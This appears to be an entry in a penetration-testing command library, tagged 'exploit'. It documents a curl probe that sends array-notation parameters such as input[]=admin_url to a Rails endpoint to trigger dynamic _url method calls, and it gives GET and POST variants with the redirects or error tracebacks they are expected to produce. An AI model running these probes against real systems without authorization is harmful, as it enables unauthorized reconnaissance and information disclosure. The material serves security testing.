---
data: >-
  curl -v -X GET "http://target.com/vulnerable?user_input[]=test_url" -o
  response.html
tags:
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.457Z'
id: 8c351c1b-7e7c-40ed-9048-291e8e900e79
verified: false
validated: true
submitted: true
---
# curl-array-probe

## Command

```bash
curl -v -X GET "http://target.com/vulnerable?user_input[]=test_url" -o response.html
```

## Description

Probes a Rails endpoint with array parameter notation to trigger dynamic _url method calls, observing for redirects or errors.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose mode | Yes |
| `-X GET` | Request method | Yes |
| `?user_input[]=method_name` | Array param to invoke method | Yes |
| `-o response.html` | Output file | No |

## Examples

### Basic Usage

```bash
curl -v -X GET "http://target.com/vuln?input[]=admin_url" -o resp.html
```

### Advanced Usage

```bash
curl -v -X POST "http://target.com/vuln" -d "input[]=secret_url" -o resp.html
```

## Expected Output

302 redirect to method's URL if exists, or 500 with NoMethodError traceback disclosing details.

## Related

- [[Related Procedure]]
